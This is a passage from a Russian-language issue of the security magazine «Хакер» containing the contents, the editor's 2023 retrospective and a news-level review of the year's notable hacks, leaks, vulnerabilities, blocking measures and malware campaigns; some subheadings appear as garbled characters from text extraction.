
            № 297
CONTENTS


    2023 год в «Хакере»
  Колон ка главреда

    GIGANEWS
  Главные события 2023 года по вер сии «Хакера»

    Авиаспоттинг по-хакерски
  Принимаем и пар сим авиационный трафик

    Разговоры в небе
  Как самолеты передают дан ные по ADS-B

    Краткий экскурс в Metasploit
  Учим ся обращать ся с легендарным фрей мвор ком

    Опасная рыбалка
  Как фишинговые ресурсы маскируют под легитимные

    Ломаем дескрипторы
  Как зло употреблять хендлами в Windows

    Приключения «Электрона»
  Отлаживаем JSC-код любой версии Electron без декомпилято ра

    Кабинетный хак
  Пат чим инсталляторы MSI, содержащие CAB-архивы

    HTB Coder
  Реверсим шиф ровальщик и применяем технику ESC5

    HTB Pilgrimage
  По выша ем привилегии через уязвимость в Binwalk

    HTB Cybermonday
  Эксплу атируем путаницу ключей JWT

    HTB Authority
  По выша ем привилегии в Windows через ESC1 и Pass the Cert

    Защита от кражи
  Как работает новый механизм безопасности в iOS 17.3

    Ты не пройдешь
  Изучаем методы предотвращения подгруз ки DLL

    Save Me VIP
  За щищаем сетевое оборудо вание от атак на примере Cisco IOS

    Титры
  Кто дела ет этот жур нал
HEADER





На носу Новый год — время, ког да принято
подводить ито ги, добивать недобитые про-
екты и плавно скатываться в десятидневный
запой. А это зна чит, что и нам тоже пора на-
катить подвести ито ги года. Для «Хакера»       Андрей Письменный                                                                                      Главный редактор
2023 год был непростым, но очень важным,         apismenny@gmail.com
так что расска зать есть о чем.


В прошлом году из «Хакера» ушел выпус кающий редактор Алексей Глазков.
Обязанности Леши были многочисленными и разнообразными. Сре ди про-
чего в их спи сок вхо дила верстка PDF — замыс ловатый процесс, основанный
на работе нес кольких кап ризных и не впол не пред сказуемых скриптов. Возня
с ними дос талась мне — вместе с мно гомесячным отста ванием по выпуску
номеров в PDF. Впрочем, я не зря шаманил над версткой весь январь: про-
цесс удалось опти мизи ровать, а отставание — сок ратить.
  Тем вре менем на сай те начала выходить серия ста тей Андрея Жукова,
известного читате лям как s0i37, посвященная физическим хакам — от снятия
данных с витой пары до конструиро вания нас тоящего хакерско го квадрокоп-
тера, который можно отправить захватывать Wi-Fi тестиру емого предприятия.
Все го мы опуб ликова ли 12 матери алов, и это, на мой взгляд, одна из силь-
нейших серий за всю исто рию журнала. Потом они вышли в виде книги «Фи-
зические атаки с использованием хакер ских устройств» — автор подробно
написал о том, как она готови лась.





В мар те мы сме нили дос тавщика поч товых рассылок — вместо Unisender ими
занялась ком пания enKod, а с нашей сто роны повели телем писем стала
Маша Нефёдова — в дополнение к работе над новостями. Ты наверняка
заметил новые попапы на сайте, облагорожен ные шаблоны писем и новые
типы самих рассылок. Все это результат большой работы, которая, впрочем,
еще про должается.
  В июне в качестве темы номера мы выбрали конференцию Positive Hack
Days. Хоть PHD и проходит каждый год, на этот раз было нечто совершенно
исклю чительное по масшта бам: «Позитивы» арендовали под мероприятие
парк Горького и устро или нас тоящий киберфести валь. От «Хакера» там был
не толь ко стенд, но и двое репортеров, которые порадовали нас отчетами.





В июле вышла важная для меня тема номера — про Flipper. На мой взгляд,
под держать интересный проект, созданный соотечес твенниками, — наша
прямая обязанность, а за судь бой «Флиппера» я слежу давно и пристально.
С Пашей Жовнером мы когда-то об щались при выходе про екта на Kickstarter,
и логич но было бы сделать что-то еще, ког да устрой ства наконец матери али-
зовались. Опубликовав первый обзор, мы обнаружи ли, что всё новые и новые
авто ры вдруг предлагают что-то написать про Flipper. Так появились статьи
про альтер натив ные про шив ки, внеш ние модули и новое интервью с Жов-
нером, которое взял не кто иной, как Даня Шеповалов.
  Из других матери алов самыми читаемыми в этом году стали вот эти три:
 1. Это он, деанон! Про биваем пользователей Telegram по откры тым источни-
   кам
 2. VPN для друзей. Разворачиваем свой VPN-сервер с оплатой через
   Telegram
 3. Что пря чет пингвин. Большой гид по сбо ру улик в Linux

К сожале нию, все статьи о VPN и дру гих методах обхода блокировок в сле-
дующем году, ско рее всего, придется убрать с сай та, чтобы соблюсти новый
закон.
   Главным же событием года, безус ловно, стал выход бумажного спец-
выпуска «Хакера». Много лет читатели про сили нас снова выпус тить журнал
в бумажном формате, и только сейчас звезды сош лись. Мы устроили экспе-
римент: собрали сбор ник из статей за три года, добавили комментарии-вос-
поминания авто ров и редакторов и выпустили на бумаге. Спасибо всем, кто
под держал и сде лал предзаказ! Теперь у нас есть все шансы зарелизить
еще один спецвыпуск в 2024 году. Пос тара емся учесть все пожелания и сде-
лать его еще лучше.





А еще в этом году почти все картинки-заходники к статьям «Хакера» рисовала
ней росеть, равно как и об ложки номеров. Если в 2022 году я сам развлекался
с DALL-E 2 и результат был кри вень ким, то теперь про цесс доверен нашему
бильд-редактору  yambuto.  Когда  нейросеть  косячит,  yambuto  вручную
доводит кар тинку до ума. DALL-E 2 мы, кстати, сменили на Midjourney. Впро-
чем, новая вер сия DALL-E снова пошла в ход: она, к при меру, помогала
иллюс трировать вышедшие вчера новостные ито ги года.





  Варианты захода к статье «Кро кокряк», которые не пошли в про дакшен,
  но повесе лили редак цию

Вот, вроде бы, и всё, что занимало редак цию пос ледний год, не давало нам
спать и тре бовало тру довых под вигов. В новом году обязательно придумаем
еще что-нибудь веселое. Если хочешь помочь нам в этом, вступай в ряды
авто ров и пос вяти праздники написанию статьи в «Хакер» вместо алкоголь-
ной комы!
  На этом разрешите откланять ся и вплотную заняться встречей нового,
удивительного и еще более непредсказуемо го 2024 года. Чего желаю и вам,
дорогие читатели. С наступающим!
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


Год подходит  к кон цу, некоторые уже начинают резать
салаты, а значит, приш ло вре мя оглянуть ся назад и вспом-
нить самые важ ные,  интересные и  забавные  события,
которыми он нам запомнится. По традиции мы составили
для тебя под борку наибо лее ярких взломов, атак, уязвимос-
тей, фейлов и дру гих исто рий ухо дяще го 2023 года. Будет
интересно, пог нали!

             АТАКА ГОДА
ЦЕПОЧКИ ПОСТАВОК





О все возможных кибера таках мы практически каждый день рассказыва ем
в «Хакере», одна ко рядовые взло мы ред ко ока зываются столь же раз-
рушительными, как атаки на цепочку пос тавок, провоцирующие настоящий
эффект домино.
  В 2023 году инци дентов такого типа и масшта ба произошло сразу нес-
колько. К примеру, от атаки на цепочку пос тавок пострадал 1% компаний —
клиентов Okta, круп ного поставщи ка систем управления доступом и иден-
тификацией. В числе жертв оказались даже такие гиганты, как BeyondTrust,
спе циализирующаяся на управле нии иден тифика цией, Cloudare и менед жер
паролей 1Password.
  В другом случае, когда пос тра дала ком пания 3CX, расследование ата ки
на цепоч ку пос тавок показало, что инци дент был выз ван другой компромета-
цией цепоч ки пос тавок.
   Так, сначала хакеры взломали компанию Trading Technologies, занима-
ющуюся авто мати зацией биржевой торговли, и распространили троянизиро-
ванные вер сии ее софта. Этой малварью случай но оказал ся заражен компь-
ютер сотрудни ка 3CX, а затем дес ктопный клиент 3CXDesktopApp и исполь-
зующие его кли енты ком пании. А в списке клиентов 3XC чис лятся American
Express, Coca-Cola, McDonald’s, BMW, Honda,  Air  France, NHS,  Toyota,
Mercedes-Benz, IKEA.
  При этом поддержка 3CX долго заверя ла клиентов, которые жаловались
на предупрежде ния от антивирус ных про дуктов, что это просто ложные сра-
баты вания.


Äðóãèå ãðîìêèå âçëîìû 2023 ãîäà
 1. Хакеры взло мали GoDaddy и оставались в сис темах ком пании нес коль ко
   лет. Один из крупнейших в мире хостеров и регис траторов доменных имен
   рассказал о череде успешных атак на свою инфраструктуру.
 2. Аккаунт Виталика Бутерина в Twitter взломали. За 20 минут хакеры похити-
   ли 691 тысячу долларов. Как объяснил Бутерин, он пострадал от ата ки
   на под мену SIM-карты (SIM swap).
 3. Крупней ший банк Китая стал жертвой шифровальщика. Инцидент повлиял
   на работу рын ка казначейских обли гаций США и вызвал проб лемы с кли-
   рингом.
 4. Хак группа Chimera провела больше двух с полови ной лет в сети ком пании
  NXP. Все это время хакеры воровали данные из корпоративной сети NXP,
   которая произво дит полупроводниковые компоненты для смартфонов,
   смарт-карт и электромоби лей.
 5. Lazarus взло мала CyberLink ради ата ки на цепочку пос тавок. Хакеры ском-
   промети ровали  тай ваньскую  компанию  CyberLink,  раз рабаты вающую
   мультимедийное ПО, и заразили трояном один из ее установщиков.


Согласно статистике компании Zimperium, в этом году появи лось
   10 новых семейств банков ских троянов для Android, которые
  в совокупности атаковали 985 банковских, финансовых и тор-
             говых приложе ний в 61 стра не мира.

        УЯЗВИМОСТЬ ГОДА
 КОРПОРАТИВНЫЕ
    ПРОДУКТЫ





Хотя о масштабных атаках и цепочке пос тавок мы уже говорили выше, мно-
гочис ленные уязвимос ти в таких корпоративных про дуктах, как MOVEit Transfer
(решение для управле ния передачей фай лов меж ду партнерами и клиентами)
и GoAnywhere MFT (еще один инструмент для переда чи файлов), тоже можно
отнести к подоб ным проблемам. Эти баги ста ли не толь ко источником голов-
ной боли для системных администраторов, но и мощ ным оружием в руках
хакеров. В этом году опасные уяз вимости и массовые взломы идут рука
об руку, а «самым слабым звеном» во всем этом хаосе опре деленно ста-
новится разнообразный корпоративный софт.
  В результате атак на уязвимос ти в MOVEit Transfer пострадали тысячи ор-
ганизаций, включая Sony, IBM, Siemens Energy, Schneider  Electric,  British
Airways, сот ни образовательных учреждений и около 85 мил лионов человек
по пос ледним подсчетам.
  Количество ком паний, постра дав ших из-за проблем в GoAnywhere MFT,
тоже исчисля ется сотнями.
  Еще одна заметная череда взло мов произошла из-за 0-day-бага в Cisco
IOS XE. Из-за этой уязвимос ти оказались за бэкдорены более 40 тысяч уяз-
вимых устройств, и про пос ледс твия этих хаков мы навер няка еще услышим.


Äðóãèå óãðîçû 2023 ãîäà
 1. Уяз вимос ти в TPM 2.0 угрожают миллиардам устройств. Проблемы поз-
   воляют аутентифици рованному локальному атакующе му переза писать
  защищенные данные в TPM, а также выполнить про извольный код.
 2. Проблема aCropalypse позволяет восста новить ори гинал отредак тирован-
   ного изображения. Замазы ваешь номер банков ской карты на фото? Экс-
   плоит для этого бага дает возможность вос становить оригинал изоб-
   ражения и сделать номер видимым.
 3. Дро ны DJI раскрывают информацию о местонахождении их пилота. Уче-
  ным удалось расшифровать ради осиг налы дронов DJI и декодировать
   исполь зуемый ими ради опротокол DroneID. Оказалось, каждый дрон DJI
   передает по протоко лу DroneID не только свои GPS-коор динаты и уни-
   каль ный идентификатор дрона, но и GPS-координаты своего опе ратора.
 4. Современные про цессоры  уяз вимы перед проб лемой  Collide+Power.
   Новая side-channel-атака может при вести к утечке данных и работает про-
   тив практически любых современных CPU.
 5. Уяз вимость в KeePass позволяет похитить все пароли поль зователя в виде
   простого тек ста. Разработчики менеджера паролей счи тают, что эта уяз-
   вимость не так уж опасна, но исследователи с этим не согласны.


Специалис ты Amazon, Cloudare и Google пре дуп редили о 0-day-
проблеме HTTP/2 Rapid Reset, которую злоумыш ленники исполь-
   зуют для DDoS — и ста вят новые рекорды. Мощность атак
 на облако Google дос тигла 398 миллионов зап росов в секунду,
 а ата ки на AWS и Cloudare превысили 155 миллионов и 201 мил-
                 лион запросов в секунду.

             УТЕЧКА ГОДА
 MICROSOFT И КЛЮЧ
      MSA





Пе чально, но факт — удивить кого-либо утечкой данных в наши дни уже прак-
тически невоз можно. Устаешь удивляться, ког да сегод ня в сеть утекли ис-
ходни ки Яндекса или Reddit, а завтра на хакфоруме слили генетические дан-
ные шести миллионов пользователей 23andMe или информацию о 360 мил-
лионах клиентов сер виса Super VPN.
  Но некоторые утеч ки могут нанес ти более серьезный ущерб, чем пуб-
ликация в откры том доступе оче редной БД. Одной из таких утечек стал слив
крип тографического клю ча MSA (Microsoft account consumer signing key),
который обычно используется для под писания токенов.
  Пикантности ситуации при дает тот факт, что утечку допустила сама ком-
пания Microsoft. И потом этот ключ использовали китай ские хакеры из груп-
пировки  Storm-0558,  взло мавшие  с  его помощью  пра вительственные
учрежде ния в США и странах Западной Европы.
  Обычно такие клю чи доверяют только про веренным сотрудникам, прошед-
шим про вер ку на благонадежность, и лишь в том случае, если они используют
выделенные рабочие станции, защищенные многофакторной аутентифика-
цией и исполь зовани ем аппа ратных токенов безопасности.
   Но, как показало расследова ние инцидента, хакеры взло мали корпоратив-
ную учетную запись неназ ванного инженера Microsoft и случайно нашли ключ
MSA в аварий ном дам пе Windows (crash dump), куда тот попал из-за бага.
Ни сам аварийный дамп, ни ключ в нем вообще не должны были находиться
там, где их обнаружили преступники.


Äðóãèå êðóïíûå óòå÷êè 2023 ãîäà
 1. Данные 200 миллионов пользователей Twitter опуб ликованы в откры том
   дос тупе. Информация поль зователей ока залась соб рана не через уяз-
   вимость в API, как изначаль но полага ли ИБ-спе циалис ты.
 2. Хак тивис ты  обнародовали ПО  и  документацию  компаний  Cellebrite
   и MSAB. Ано нимный источник передал Enlace Hacktivista софт и докумен-
   тацию ком паний, которые предоставляют правоохранительным орга нам
   разных стран инструменты для взло ма мобильных устройств и проведе ния
   прочих киберкри миналистичес ких операций.
 3. Информацию 478 тысяч пользователей RaidForums выложили на новом
   хакерском сай те. БД RaidForums содержит огромное количес тво данных,
   которые заинтересуют преступников, исследователей и, вероятно, пра-
   воохранительные органы.
 4. Tesla обви нила инсайдеров в сливе дан ных 75 тысяч сотрудников. Утеч ка
   произошла после того, как два инсайдера поделились информацией
   из внутренних систем ком пании с немец ким изда нием Handelsblatt.
 5. Спе циалисты обнаружили две утечки данных пользовате лей «СберСпа-
   сибо». В общей сложности были обна родованы 51 977 405 уникальных
  номеров телефо нов и 3 298 456 уни кальных email-адресов.


    В Kaspersky Digital Footprint Intelligence подсчитали, что
 в 2023 году зафик сировано 133 слу чая пуб ликации зна чимых БД
                      компаний.
 По сравнению с 2022 годом объявлений об утечках ста ло мень-
     ше, зато объем опуб ликованных дан ных вырос на 33%.

       ИССЛЕДОВАНИЕ ГОДА
    TETRA:BURST





Уче ные, ком пании и независимые иссле дователи регуляр но публику ют объ-
емные (около)науч ные тру ды, пос вященные обнаружению новых векторов
атак и фундамен таль ным уяз вимостям в технологиях и продуктах. Но далеко
не всег да пуб ликации подобных исследователь ских работ оборачи ваются
серьезны ми последстви ями и общес твен ным резонансом, как это произошло
с TETRA:BURST.
  Эксперты из гол ландской ком пании Midnight Blue выявили пять серьезных
уязвимос тей и бэкдор в стандарте тран кинговой радиосвя зи TETRA (Terrestrial
Trunked Radio), который используют правоох ранитель ные органы, военные
и опе раторы критической инфраструктуры по всему миру. Баги получили
общее название TETRA:BURST и позволяли даже рас шифровывать данные
в режиме реального времени.
  После пуб ликации этой научной работы и выс тупле ния иссле дова телей
на конференции Black Hat проблемы безопас ности TETRA стали очевид ны
всем, а секретность самих алго ритмов TETRA выз вала немалое возмущение
в ИБ-сообществе. В итоге несколько месяцев спустя Европейский институт
телекоммуникационных стандартов (ETSI) принял решение, что набор проп-
риетарных алгоритмов шиф рования, используемых в TETRA, должен стать
достоянием общественности и отныне будет открыт для академических
иссле дований.


Äðóãèå èíòåðåñíûå èññëåäîâàíèÿ 2023 ãîäà
 1. Угон авто возможен через вскрытие фар и подключение к CAN-шине.
  Для реализации таких атак автоугонщики получают доступ к CAN-шине
   авто через про вод ку в фарах, а устройства для взлома маскируют
   под Bluetooth-колонки JBL (на случай, если у полиции или прохожих воз-
   никнут какие-то подоз рения).
 2. Иссле дователи показали взлом аппарат ного кошель ка Trezor T. Эксперты
   ком пании Unciphered утверждают, что раз работчикам  Trezor извес тно
  об уяз вимос ти в чипе STM32 и модели Trezor T, но компания не дела ет
   ничего, что бы ее устранить.
 3. Деаноними зировать  Tor-серверы можно  через  ETag.  ИБ-спе циалист
   показал спо соб выявления реальных IP-адре сов серверов Tor. Исследова-
   тель исполь зовал для этого ETag (entity tag) в заголовке HTTP-отве тов.
 4. Джей лбрейк Tesla разбло кирует плат ные фун кции авто. Исследователи
   разработали метод джейлбрейка инфо тейнмент-сис тем на базе про цес-
   соров AMD. Такие системы исполь зуются во всех последних моделях авто-
  моби лей Tesla.
 5. Подрос тки хакнули транспортные карты мет ро Бостона, вдохновив шись
   атакой 2008 года. Четверо под ростков расска зали на DEF CON о том,
   как взло мать транспортные карты CharlieCard.


   Го ды идут, но некоторые вещи не меняются. Список самых
    популярных паролей все еще возглавляют 123456, admin
  и 12345678, для взлома которых требуется меньше секунды.
Не менее часто встре чается пароль UNKNOWN, на взлом которого
                требует ся уже целых 17 минут!

         БЛОКИРОВКА ГОДА
VPN И ИНФОРМАЦИЯ
   ОБ ОБХОДЕ
   БЛОКИРОВОК





Для российских пользователей этот год определен но прошел под знаком
блокировки отдельных VPN-сер висов и целых протоколов. С самого начала
года Роскомнадзор предупреждал о том, что использование VPN небезопас-
но, и ре комендовал ком паниям отказаться от VPN на зарубежных сер верах.
  Затем пользовате ли со всех уголков РФ стали массово жаловать ся
на проблемы, то и дело воз ника ющие в работе OpenVPN и Wireguard.
  А под конец года СМИ и вовсе сообщили, что Роскомнадзор впервые
включил про токол Shadowsocks  в список VPN-сервисов, под падающих
под блокировку. Для блокировки протокола ведомс тво намерено исполь-
зовать технические средства противо действия угрозам на трансгра ничных
соединениях.
   Также не сто ит забывать о том, что теперь Рос комнад зор надели ли пол-
номочиями вно сить в Единый реестр зап рещенной информации сай ты,
которые содержат информа цию об обхо де блокировок. В РКН уже перечис-
лили кри терии, которые будут использовать ся для оценки таких сайтов.


Äðóãèå íîâîñòè áëîêèðîâîê 2023 ãîäà
 1. Китайские инструменты для обхо да блокировок исчезают с  GitHub.
   Более 20 инс трументов, предназна ченных для обхода «Великого китай-
   ско го файрвола» и дру гих блокировок, пропали с GitHub. Вероятно, китай-
   ско му правительству удалось деано ними зиро вать разработчиков этих ути-
   лит и оказать на них давление.
 2. Рос комнадзор зап ретил поисковикам показывать сайты ряда иностранных
   хос тингов. Све дения о сай тах ком паний, которые «не выполняют свои обя-
   занности по закону о „приземлении“», теперь нельзя показывать в резуль-
   татах поиска.
 3. WhatsApp запустил поддержку прок си-сер веров. Мессенджер будет под-
  держи вать под клю чение через прокси-серверы, на тот слу чай, если пра-
   вительство блокирует сервис в стране пользователя или там наб людаются
   отклю чения интерне та.
 4. Китай планирует ограничить использование Bluetooth и Wi-Fi внутри стра-
  ны. Ожи дается, что операто ры беспроводных сетей должны будут «пре-
   дот вращать  и  противостоять»  использованию  своего  оборудо вания
   для распростра нения фальшивых новос тей и незаконного контента, сразу
   сообщая о таких действи ях влас тям.
 5. Рос комнадзор запустил автоматическую систему поис ка запрещенного
   кон тента «Окулус». Необ ходимость использования автоматизированной
   системы поис ка зап рещенного контента в ведомс тве объ яснили растущим
   потоком запрещен ных материалов в интернете.


 Аналитики Recorded Future сообщили, что с 2017 года северо-
  корейские группиров ки (Kimsuky, Lazarus, Andariel и другие)
успешно похитили более 3 миллиардов долларов в криптовалю те
   и ответственны за 44% всех криптоог раблений 2023 года.

   НАРУШИТЕЛЬ ПРИВАТНОСТИ ГОДА
     GOOGLE





В этой номинации абсолютным лидером ста ла быв шая «корпорация добра»,
то есть Google. Что сов сем неудивительно, ведь современный бизнес этих
ребят в основном стро ится вокруг наших с тобой данных.
  Нап ример, осенью Google начала раз вертывать новую рекламную плат-
форму Privacy Sandbox, основанную на инте ресах поль зователей. Компания
стремится пол ностью уйти от сторонних трекин говых cookie и переложить
задачу отсле живания любых интересов пользователя на сам браузер Chrome.
  Иронично, но почти одновременно с этим ком панию обязали вып-
латить 93 миллиона долларов, так как американ ские влас ти уста нови ли, что
Google «использовала обманные практики, связанные со сбором, хранением
и исполь зованием данных о мес тополо жении пользователей устрой ств
под управлением Android».
   Также в этом году Google активно препятство вала работе блокировщиков
рекламы на YouTube.
  При этом разработ чики блокировщиков признают, что вскоре ситуация
осложнится еще больше, так как в 2024 году в силу всту пит скандальный
Manifest v3, который определяет возможности и ограничения для рас-
ширений. Он не только создаст большие проблемы для работы множества
рас ширений, но и замет но замедлит их обновле ния. А скорость реагирова-
ния на изме нения очень важна для работы блокиров щиков.
  Еще стало известно, что в Google кипит работа над Web Integrity API,
который поз волит сай там блокировать любые клиентские при ложения, изме-
няющие их код. Эта раз работка уже вызвала шквал критики и получила проз-
вище «DRM для интернета».
  Помимо этого, Google поймали на уда лении ссылок на контент, наруша-
ющий DMCA («Закон об авторском праве в циф ровую эпоху»), из личных кол-
лекций пользователей. В ито ге эксперты опасаются, что в будущем Google
может начать применять подоб ную «модера цию» даже к закладкам поль-
зователей Chrome или своему DNS-резол веру.


Äðóãèå íîâîñòè ïðèâàòíîñòè 2023 ãîäà
 1. В Яндексе заявили, что Алиса не подслушива ет поль зовате лей. Пос ле
   утечки исходных кодов ком пании пришлось объяснять, что алгоритм, пос-
   редством которого микрофон вклю чается без упоминания Алисы, работа-
   ет только в бета-вер сии, тестиру емой самими сот рудни ками компании.
 2. Microsoft сканирует компьюте ры в поисках старых версий Oﬃce. Обновле-
   ние KB5021751 собирает данные диагности ки и телемет рии в системе,
   если вла делец ПК все еще использует уста ревшую версию Oﬃce (Oﬃce
   2013, Oﬃce 2010 и Oﬃce 2007).
 3. ByteDance сле дила за жур налисткой Financial Times через аккаунт ее кош-
   ки. Предста вите ли TikTok признались, что отслеживали мес тоположение
   журналистки, пытаясь выявить источник утечки информации внутри ком-
   пании.
 4. Влас ти шпи онят за пользователями Apple и Google через push-уведом-
   ления. Правитель ства по все му миру запрашивают у Apple и Google дан-
  ные о поль зовательских push-уведом лени ях, что бы следить за конкрет-
  ными устройствами и людь ми.
 5. Mozilla назвала современные авто «кош маром» с точки зре ния конфиден-
   циаль нос ти. Практически все авто собирают огромные мас сивы лич ных
   данных о поль зователях, а  также  требуют,  что бы люди разрешали
   собирать и про давать такие сведения о себе, как данные об инвалид-
   ности, генети ческая информа ция, шаблоны лиц и даже данные о сексуаль-
   ной активнос ти.


Сум марно в 2023 году было обнаруже но 26 447 уязвимостей (на
 1500 CVE больше, чем в 2022 году). Однако из них представляли
  реаль ную угрозу и использовались злоумышленниками мень-
                     ше 1%.

          МАЛВАРЬ ГОДА
    «ОПЕРАЦИЯ
  ТРИАНГУЛЯЦИЯ»





                                     Продолжение статьи →
← Начало статьи

  Са мым опасным вре доносом прошед шего года с легкостью можно было бы
  наз вать любой активный шифровальщик, потому что вымогательские ата ки
  дей ствительно представ ляют серьезную угро зу для организаций и поль-
  зователей по все му миру. Достаточно вспомнить серию атак на американ-
  ские казино и курорты или мас штаб ную атаку, нарушившую работу крупней-
  шего порта Японии.
    Однако, на наш взгляд, одним из наиболее инте ресных событий 2023 года
   ста ло  обнаруже ние  шпионской  кампании  «Операция  „Триангуляция“»,
  о которой сообщили ФСБ и ФСО России, а затем эксперты «Лаборатории
  Кас перско го».
     Эту кам панию, начавшуюся еще в 2019 году, назвали «разведыватель ной
  акцией американских спецслужб, про веденной с исполь зовани ем мобильных
  устройств фир мы Apple», а целью атак, по словам исследователей, было
  внедрение спайвари в iPhone сотрудников «Лабора тории Каспер ского» (как
  топ-менеджмента, так и руководителей сред него звена).
     Как стало извес тно позже, в этих атаках использовалось пять уязвимостей,
  четыре из которых оказались ранее неизвестными 0-day, и их спешно испра-
  вила Apple. Одна из уязвимостей, свя занная с недокументированной аппа-
   рат ной функцией в чипах Apple, так и осталась для экспертов загадкой.
     Также был опуб ликован развернутый анализ самой мал вари TriangleDB,
  написанной на Objective-C. Вредонос загружал ся на устрой ства жертв после
   того, как ата кующие получа ли root-права в результате успешной эксплуатации
   уязвимос ти в ядре iOS.


  Äðóãèå âðåäîíîñû 2023 ãîäà
    1. Все го три загрузчи ка малвари ответственны за 80% атак. По данным
      ReliaQuest, на загрузчики QakBot, SocGholish и Raspberry Robin приходит-
     ся львиная доля всех наблюдаемых атак.
    2. Шифровальщик Rorschach назван самым быстрым. Малвари потребова-
     лось 4,5 минуты для шиф рования 220 тысяч фай лов на машине с 6-ядер-
    ным процессором.
    3. Исходники UEFI-буткита BlackLotus опубликова ны на GitHub. Исследова-
     тели опасают ся, что утечка исходного кода поз волит зло умышленни кам
     ком биниро вать  буткит с новыми  уяз вимостями,  как извес тными,  так
     и неизвестны ми.
    4. Преступни ки все чаще исполь зуют фреймворк Sliver в своих операциях.
     Легальный C2-фрей мворк Sliver набира ет популярность сре ди хакеров,
      становясь опенсор сной альтернативой Cobalt Strike и Metasploit.
    5. Hiatus  ата кует  роутеры  бизнес-клас са,  превращая  их  в  устройства
     для шпи онажа. В рам ках этой кам пании хакеры могут перехватывать элек-
     тронную поч ту жертв и похищать фай лы.


  Крупнейшим криптовалютным ограблением 2023 года стала ата-
    ка на одно ранговую транзакционную сеть Mixin Network, пред-
    назначенную для масштабирования и уско рения транзакций.
      Хакеры похитили у платформы 200 миллионов дол ларов.

       ХАРДВЕРНЫЙ ВЗЛОМ ГОДА
   УСТРОЙСТВА С
    ЗАКЛАДКАМИ





  В прош лые годы в этой номинации мы рассматривали инте ресные аппарат-
  ные хаки, проведенные ИБ-исследова телями, но в этом году пришла пора
  рас сказать о железе, которое изна чально продается взломанным!
    Сразу несколько компаний опубликова ли  отчеты, предупреждающие
  о том, что в онлайне и офлайне про даются миллионы устройств, заражен ных
  малварью прямо «из короб ки».
     Нап ример, в продаже на Amazon нашли Android-приставки T95, которые
  ком плектуются сложным вре доносом CopyCat. Еще в 2017 году эта малварь
  заразила боль ше 14 миллионов устрой ств по все му миру, получи ла root-дос-
   туп к восьми миллионам из них и за два месяца принесла своим авторам око-
  ло 1,5 миллиона долларов США.
     Аналити ки Human Security опубликовали большое иссле дова ние, основан-
  ное на этой находке, и приш ли к выводу, что аналогичные бэкдоры содержат
  еще семь приставок и один планшет, а также признаки зараже ния демонс-
  трируют более 200 моделей других Android-устройств.
      Trend Micro, в свою очередь, предуп редила, что миллионы Android-смар-
  тфонов, часов, телевизоров и телеви зионных приставок заражены малварью
   Guerilla, которая исполь зуется для заг рузки допол нительных пейлоадов,
  перехвата одноразо вых паролей  из SMS, нас трой ки обратных прокси
  на зараженных устрой ствах, перехвата сеан сов в WhatsApp и так далее.
    Между про чим, описанное снова возвращает нас к началу этой статьи.
  Ведь речь тоже идет о ком прометации цепочки пос тавок, хотя исследователи
  не знают, на каком именно эта пе про исхо дит зараже ние девай сов. Нап-
  ример, воз можна ком прометация сто роннего ПО, процес сов обновления
  про шив ки, а также привлечение инсайдеров на производс твах или в цепочке
  рас пространения про дуктов.


  Äðóãèå «æåëåçíûå» íîâîñòè 2023 ãîäà
    1. У Flipper Zero появился собственный магазин при ложе ний. Здесь можно
     найти hex-редакторы, фаз зеры, уни версальные пульты дистанционного
     управления и многое другое.
    2. Основатель Pebble предста вил Beepberry — Raspberry Pi с клавиатурой
     от BlackBerry. Устройство соз дано для использования с универсальным
     мессен дже ром Beeper, объединившим в себе 15 при ложений от Twitter
     до WhatsApp, и ориенти ровано на тех, кто хочет оставаться на связи, но не
      хочет поль зовать ся обычным смартфоном.
    3. Eclypsium: материнские платы Gigabyte содер жат бэкдор. Прошивка мно-
      гих материнских плат содержит Windows-бинар ник, который выполняется
     при загрузке операци онной системы. Затем этот файл загружает и запус-
      кает другую полезную нагрузку с сер веров Gigabyte.
    4. Экс пло ит SH1MMER поз воляет «джейлбрейкнуть» Chromebook. Можно
     «разблокировать» корпоративный или учебный Chromebook и устанав-
     ливать на устрой ство любые приложения.
    5. На YouTube обнаружи ли ролик, заставляющий перезагружаться смартфо-
     ны Pixel. Отры вок из фильма «Чужой» в качестве 4K HDR странно вли яет
     на устройства Pixel, работающие на базе про цессоров Google Tensor.


  Чаще все го в 2023 году пиратили сери ал «Одни из нас». На вто-
  ром месте по скачиваниям находится «Мандалорец», а замыкает
          тройку лидеров второй сезон сери ала «Локи».

          СТРАННОСТЬ ГОДА
 СВОЕВОЛЬНЫЕ 3D-
     ПРИНТЕРЫ





  Что может быть более странным и пугающим, чем устройство, которое вне-
  запно начинает работать само по себе, без участия человека? Владель-
  цы 3D-принтеров Bambu Lab точно ответят — ничего.
    В августе 2023 года принтеры Bambu Lab начали «жить своей жизнью»
  и зарабо тали сами по себе, что в ито ге при вело к поломкам и пол ному выходу
  девай сов из строя, печати новых проектов поверх старых, создало угро зу
  воз горания и добави ло их владельцам немало седых волос.
     Как вско ре объяснил производитель, массовый сбой 3D-принтеров про-
  изошел из-за ошиб ки в работе обла ка компании: задания, отправленные
  на печать, оказались заб локиро ваны в облаке и запустились нем ного поз же,
   когда людей уже не было рядом.
    В итоге представители Bambu Lab изви нились перед вла дель цами 3D-
  принтеров и заяви ли, что берут на себя «полную ответс твенность за случив-
  шееся». Ком пания пообещала помочь пос традавшим с ремонтом, а также
  бесплатно выслать им нужные зап части и филамент.


  Äðóãèå ñòðàííûå íîâîñòè 2023 ãîäà
    1. Поддержка Microsoft «взламывает» Windows пользователей из-за проб лем
     с акти вацией. Оказалось, что инженеры службы под держки Microsoft тоже
     иногда используют кряки.
    2. Иссле дователь нашел текст песни Coldplay в прошив ке SSD Kingston.
     Неизвестно, слу жит ли этот скры тый текст какой-то функциональной цели,
     нап ример играет роль образцов дан ных для тестирова ния, или это просто
     шут ка разработ чиков.
    3. На OpenAI и Microsoft подали в суд за «похищение 300 мил лиардов слов
     из интернета». Истцы требуют возмещения ущерба в раз мере 3 миллиар-
     дов дол ларов США, так как компании якобы похитили «огромные объемы
     лич ной информации» у интернет-пользователей, без их согласия обучая
     ChatGPT на их данных.
    4. Подрядчик «окирпичил» FPV-очки Orqa для опе рато ров дронов, испортив
     прошивку. Быв ший подрядчик саботи ровал работу устрой ств, намеренно
     заложив в прошив ку «кодовую бомбу».
    5. Иссле дователь взло мал боль ше десяти библиотек в Packagist, пыта ясь
     найти работу. Пострадали 14 биб лиотек в Packagist, часть из которых нас-
     читывает сот ни миллионов установок.


   По данным Ookla, в рейтинге скорости мобильного интернета
    в 2023 году Рос сия занимает 102-е место со сред ним показа-
